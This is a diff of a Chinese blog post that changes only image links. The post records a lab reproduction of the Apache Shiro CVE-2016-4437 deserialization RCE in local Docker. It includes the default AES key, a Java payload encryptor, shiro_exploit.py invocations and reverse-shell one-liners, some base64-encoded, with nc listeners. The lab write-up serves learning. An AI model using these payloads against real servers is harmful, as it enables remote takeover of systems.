@@ -163,7 +163,7 @@
 
         <div class="post-content">
             <p><strong>漏洞成因：</strong></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648116087699-affcc432-03dd-4f18-98a9-3ce993832542.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/27.png"></p>
 <p><strong>影响版本：</strong></p>
 <p>影响Shiro&lt;1.2.5,当未设置用于”remember me”特性的AES密钥时，存在反序列化漏洞，可远程命令执行</p>
 <p><strong>环境创建：</strong></p>
@@ -171,7 +171,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \vulhub-master\shiro\CVE-2016-4437</span><br><span class="line"><span class="comment">#执行命令</span></span><br><span class="line">docker-compose build</span><br><span class="line"><span class="comment">#因为8080跟burp的端口冲突了然后我修改端口为9090</span></span><br><span class="line">打开docker-compose.yml</span><br><span class="line">修改端口</span><br><span class="line">    - <span class="string">&quot;9090:8080&quot;</span></span><br><span class="line"><span class="comment"># 启动整个环境</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 <p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:9090/">http://127.0.0.1:9090/</a></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1647322115532-ea5b65ef-e450-4edb-abdf-e965a91efcc2.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/1.png"></p>
 <p>复现需要ysoserial工具：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>
 
@@ -190,7 +190,7 @@
 <p>链接失效了<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
 <p>大佬发了个替代的</p>
 <p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1647325054826-014c3847-9675-40c0-9fdb-38046441c2af.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/2.png"></p>
 <p>然后运行命令（通过 ysoserial中的JRMP监听模块，监听 6666 端口并执行反弹shell命令） 看不懂什么意思，反正先试试看</p>
 <p>注：</p>
 <p>payloads&#x2F;JRMPClient 是结合 exploit&#x2F;JRMPListener 使用的；<br>JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后Server中进行反序列化操作，并开启指定端口，然后在通过JRMPClient去发送攻击 payload；<br>payloads&#x2F;JRMPClient 生存的 payload 是发送给目标机器的，exploit&#x2F;JRMPListener 是在自己服务器上使用的。</p>
@@ -199,11 +199,11 @@
 
 <p>要在linux中运行 windows运行报错</p>
 <p>监听6666端口</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1647325843673-4886c41a-f878-4baa-a9f2-917e8fe435d6.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/3.png"></p>
 <p>python shiro.py 攻击者IP:攻击者监听的java端口</p>
 <hr>
 <p>上周在忙工作，这周开始复现</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648114024305-a4947b0b-fe23-4329-bf48-a71b743e33e1.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/4.png"></p>
 <p>重新启动docker</p>
 <p>以下为闲话可以忽略。。。</p>
 <p>复现需要用到一个ysoserial-master-xx.jar的工具，你问我在哪里下我也不知道，找大佬要的，反正很好用就对了，对了，复现漏洞你要了解原理，要了解java反序列化什么cc1链什么的，反正我现在都不会，就先复现漏洞好了，记录下版本号，记录下危害，到实际利用的时候能使用就好了，原理什么的是后面的事情，一上来就学原理脑袋都大了。</p>
@@ -220,7 +220,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//FileSystems.getDefault().getPath(&quot;C:/&quot;, &quot;access.log&quot;);</span></span><br><span class="line">            <span class="comment">//payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));</span></span><br><span class="line">            payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;C:\\Users\\tea90\\Documents\\tea\\tools&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line">            <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">            <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">            System.out.printf(ciphertext.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Base64DecodingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>执行结果</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648115845892-c8191993-344a-4c34-a182-b37f712a2a91.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/5.png"></p>
 <p>有个报错，但是也跑出来不知道对不对</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
 
@@ -229,9 +229,9 @@
 <p>用户名和密码为：admin:vulhub</p>
 <p>用127.0.0.1抓不到包</p>
 <p>用<a href="http://localhost:9090访问">http://localhost:9090访问</a></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648131191228-25322577-3389-4a54-8d73-531131b0a70f.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/6.png"></p>
 <p>直接替换cookie</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648131280065-a0ff9b99-3665-438a-ba81-6ff11acad134.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/7.png"></p>
 <p>刷新页面，进入docker的控制台看命令是否执行了</p>
 <p><strong>反弹shell</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.160/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
@@ -240,7 +240,7 @@
 <p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1bnRpbWUtZXhlYy8=&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648132324308-594f65ae-8c2f-461c-aaa6-01773ed6c3f6.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/8.png"></p>
 <p>攻击端监听 nc -lvp 6666</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u http://127.0.0.1:9090/doLogin -p <span class="string">&quot;bash -c &#123;echo,aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1 bnRpbWUtZXhlYy8=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
@@ -251,60 +251,60 @@
 <p>大佬推荐了个python虚拟环境conda可以之后试一试</p>
 <p>Fatal error in launcher: Unable to create process using ‘“‘（已解决）</p>
 <p>就重新安装一下python点击modify或者repair就好了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171151570-6920a767-3bbf-493c-b07f-6057fbf869b7.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/9.png"></p>
 <p>然后还出现了一个问题，安装requests的包就一直为空，解决方法是python3和python2共存</p>
 <p>步骤就是 先安装python3 然后设置环境变量，在安装python2设置环境变量（C:\Python27;C:\Python27\Scripts   这两个目录添加到环境变量里），把安装目录的python改成python2和python3，pythonw改成pythonw2和pythonw3</p>
 <p>然后使用的命令为python2和python3</p>
 <p>还有在分别安装pip</p>
 <p>python2 -m pip install –upgrade pip –force-reinstall</p>
 <p>python3 -m pip install –upgrade pip –force-reinstall</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171271698-40512a33-a0d3-44bb-aa83-4d418c644da7.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/10.png"></p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qj30212/article/details/78565083">https://blog.csdn.net/qj30212/article/details/78565083</a></p>
 <hr>
 <p>搞完上面所有的步骤之后，我发现还是安装不上，太晚了我就睡觉了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171601427-107741d6-8ca5-4788-855d-a484c73d4b1f.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/11.png"></p>
 <p>后来为什么好了，我到公司重新尝试就好了，我也不知道什么原因，因为我各种方式都尝试了，增加超时时间，换源都尝试了昨天就是不好，今天就好了</p>
 <p>现在可以安装requests包了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171704071-728c57e8-39eb-472d-afe3-da34461d1e79.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/12.png"></p>
 <p>还有个依赖包要装</p>
 <p>ImportError: No module named Crypto.Cipher</p>
 <p>pip2 install pycrypto</p>
 <p>然后又报错了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648172523854-40158f82-1bcd-4de0-bd1b-79ad4b4ea10c.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/13.png"></p>
 <p><a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
 <p>打开网站搜索到pycrypto手动进行安装</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648172566812-a597d7ba-d217-4079-808a-ea4dac2c3dd8.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/14.png"></p>
 <p>他说不在维护了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648172710632-10213b7b-71db-4e63-93a9-4bae6bec1089.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/15.png"></p>
 <p>那我只好重新写个脚本了，首先看下脚本大概的功能然后在进行重写</p>
 <p>本来打算重写了，可无奈看不懂代码，于是我继续搜索，发现了这个</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648173294398-878a5a92-45e5-4480-90c6-4d8fd7af6f64.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/16.png"></p>
 <p>看来无论如何都要安装conda了</p>
 <p>开搞！</p>
 <p>首先要从<a target="_blank" rel="noopener" href="https://docs.conda.io/en/latest/miniconda.html">https://docs.conda.io/en/latest/miniconda.html</a></p>
 <p>这个网址下载你对应系统的安装包，如果其他系统的，你不会那我建议你搜下教程，因为我也不会</p>
 <p>我只需要下载win64版本的就好了</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648173480969-8dca5fcc-f803-4b51-a24d-da640562d0e8.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/17.png"></p>
 <p>安装过程就是一路下一步，然后选择加到环境变量，重新打开一个命令行执行conda看是否可以执行</p>
 <p>然后添加国内源</p>
 <p>尝试执行conda install pycrypto</p>
 <p>然后那个小竖线一直在转 它在转我在等，结果到底是什么</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648173749532-0f249afc-35be-42e1-a9ca-d19dc6c3ded7.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/18.png"></p>
 <p>进行到这里的时候，有大佬发过来一个网站，欣喜若狂</p>
 <p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20210709153323/http://www.voidspace.org.uk/python/pycrypto-2.6.1/">https://web.archive.org/web/20210709153323/http://www.voidspace.org.uk/python/pycrypto-2.6.1/</a></p>
 <p>起因是pycrypto安装不上吗，</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648175105300-d1e1e068-08f0-4c78-a498-0ac13426a57c.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/19.png"></p>
 <p>然后一直搜索搜到了个<a target="_blank" rel="noopener" href="http://www.voidspace.org.uk/python/pycrypto-2.6.1/">http://www.voidspace.org.uk/python/pycrypto-2.6.1/</a></p>
 <p>这个网站，访问了之后，挂掉了。。。</p>
 <p>然后大佬发来了个那个站好像挂了，这里可以访问历史页面</p>
 <p>然后点击下载,我也不知道下哪个 随便选选中了这个</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648174199213-5fd0fa0a-e7bb-450b-bacc-779ebb8fe0c9.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/20.png"></p>
 <p>下载安装— 在重新打开个命令行 在尝试执行脚本</p>
 <p>python2 shiro_exploit.py -t 3 -u <a target="_blank" rel="noopener" href="http://127.0.0.1:9090/doLogin">http://127.0.0.1:9090/doLogin</a> -p “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzY2NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648174363668-c5562319-103f-4cb3-ad38-18e90a51ae3a.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/21.png"></p>
 <p>好像好了，他不在报依赖的问题了，他开始报代码的问题了</p>
 <p>遂，查询代码看看，他可能是下面那个jar包没有找到，换成我之前工具的名字，ysoserial-master-SNAPSHOT.jar在尝试执行。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648174426075-535a0b8e-97f4-4698-bb16-fbf4da498330.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/22.png"></p>
 <hr>
 <p>重新尝试执行脚本</p>
 <p>因为到公司了ip换了 我重新测试nc可不可以联通</p>
@@ -313,7 +313,8 @@
 <p>nc -lvp 6666</p>
 <p>docker中的环境尝试反弹shell</p>
 <p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.101&#x2F;6666 0&gt;&amp;1</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171993485-32ce2386-d75d-40e6-9efc-86f645bb51b8.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171979502-1895c635-70d8-439e-a026-2c07f603bc4d.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/23.png"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/24.png"></p>
 <p>看到已经可以反弹shell了</p>
 <p>重新命令编码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzY2NjYgMD4mMQ==&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
@@ -323,9 +324,9 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u http://127.0.0.1:9090 -p <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>需要等一会，然后成功反弹shell</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648175295272-ce499d3d-b42e-4902-8ab0-531b63ee8e79.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/25.png"></p>
 <p>跟docker的id是一样的</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648175354300-95cb7ca9-5cee-467f-91f7-ccdce0e111e1.png" alt="img"></p>
